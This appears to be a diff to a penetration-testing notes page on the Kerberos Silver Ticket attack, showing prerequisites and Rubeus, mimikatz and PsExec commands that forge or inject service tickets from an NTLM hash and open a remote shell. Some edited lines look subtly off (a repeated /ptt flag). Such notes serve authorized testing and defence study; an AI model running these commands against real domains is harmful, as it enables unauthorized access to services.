@@ -2,7 +2,7 @@
 A Silver Ticket attack involves forging a valid **service ticket (TGS)** for a specific service within a [[88 - Kerberos]] environment, using the service account's *NTLM* hash. Once crafted, the forged ticket allows an attacker to authenticate to the targeted service as any user, often bypassing domain controllers entirely. This technique is limited to individual services but offers stealthy, long-term access if the service account hash remains unchanged.
 
 ## Prerequisites
-- Having the NTLM hash of a service account, such as a computer account, to forge a **Ticket Granting Service (TGS) ticket**.
+- Having the *NTLM* hash of a service account, such as a computer account, to forge a **Ticket Granting Service (TGS) ticket**.
 
 ## Tools
 - [Impacket - ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
@@ -24,21 +24,19 @@ python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ## Windows
 ```powershell
 # Using Rubeus
-## /ldap option is used to get domain data automatically
-## With /ptt we already load the ticket in memory
-rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd
+rubeus.exe asktgs /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /ldap /service:cifs/<DOMAIN> /ptt /nowrap /printcmd /ptt
 
 # Create the ticket
-mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
+mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>" /ptt
 
-# Inject the ticket
+# Inject the ticket (If needed manually)
 mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 .\Rubeus.exe ptt /ticket:<TICKET_FILE>
 
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-
+For both `mimikatz` and `Rubeus`, the `/ptt` flag is used to automatically inject the ticket.
 
 # Services
 | Service Type                                | Service Silver Tickets          |
